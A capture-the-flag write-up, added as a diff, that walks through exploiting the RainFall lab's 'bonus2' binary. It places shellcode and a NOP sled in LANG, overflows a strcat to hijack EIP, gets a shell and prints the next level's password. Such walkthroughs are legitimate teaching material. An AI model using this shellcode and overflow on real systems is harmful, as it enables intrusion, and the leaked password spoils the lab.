@@ -1,0 +1,71 @@
+A global variable `language` is present:
+(gdb) info variables
+All defined variables:
+
+Non-debugging symbols:
+[...]
+0x08049988  language
+
+We need 2 program arguments (argc == 3) otherwise it exits directly.
+
+40 bytes of argv[1] are copied into a first buffer, 32 bytes of argv[2] into a second one.
+
+There is a call to getenv with the parameter "LANG", we could use that to inject code.
+The value returned is stored in the global variable `language`.
+
+Assuming a variable exists, it is then compared with 2 string literals, "fi" and "nl" with memcmp.
+`language` gets assigned 1 or 2 in case of success, respectively
+
+Then the function `greetuser` is called with the first buffer as its argument.
+
+This function checks the global variable and calls strcpy from literals into a local buffer, then the parameter is the concatenated to it, before it gets printed.
+
+We can find a way to exploit the environment variable by putting the shellcode in it and getting its approximate address with getenv:
+bonus2@RainFall:~$ nano /tmp/env.c
+bonus2@RainFall:~$ cat /tmp/env.c
+#include <stdlib.h>
+#include <stdio.h>
+int main()
+{
+    printf("%p\n", getenv("LANG"));
+}
+
+bonus2@RainFall:~$ cc /tmp/env.c -o /tmp/env
+bonus2@RainFall:~$ /tmp/env
+0xbffffdef
+
+We can then fill it with one of the two language it will compared to in the program, "fi" or "nl", we'll pick "fi" in this case.
+Then we can add a NOP sled so that we don't have to perfectly get the offset right.
+Finally, we'll append our usual shellcode.
+
+Here is what we'll use for the environment variable $LANG:
+python -c "print('fi' + '\x90' * 256 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"
+p
+Now we need to find eip in our buffer to override it and point inside our NOP sled.
+We can do this by overflowing our buffers, in this case by putting 40 characters in argv[1] and 22 in argv[2] the strcat in `greetuser` will cause an overflow which will let us overwrite the instruction pointer.
+
+The string "Hyvää päivää " prepended to our buffer when $LANG starts with "fi", its size is 18, that explains why we don't need to reach 32 to overflow our second buffer.
+
+(gdb) r aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj 123456789012345678AAAA
+Starting program: /home/user/bonus2/bonus2 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj 123456789012345678AAAA
+Hyvää päivää aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj123456789012345678AAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+0x41414141 corresponds to the "AAAA" at the end.
+
+Our exploit will look like this in the end:
+argv[1] 0-40 bytes: Filler
+argv[2] 0-18 bytes: Filler
+argv[2] 18-22 bytes: Address of $LANG (0xbffffdef) + 2 for "fi" (+ potential margin to roughly enter the NOP sled, not done here)
+
+./bonus2 `python -c "print 'a' * 40"` `python -c "print 'b' * 18 + '\xbf\xff\xfd\xf1'[::-1]"`
+
+bonus2@RainFall:~$ ./bonus2 `python -c "print 'a' * 40"` `python -c "print 'b' * 18 + '\xbf\xff\xfd\xf1'[::-1]"`
+Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbb����
+$ whoami
+bonus3
+$ cd ../bonus3
+$ cat .pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
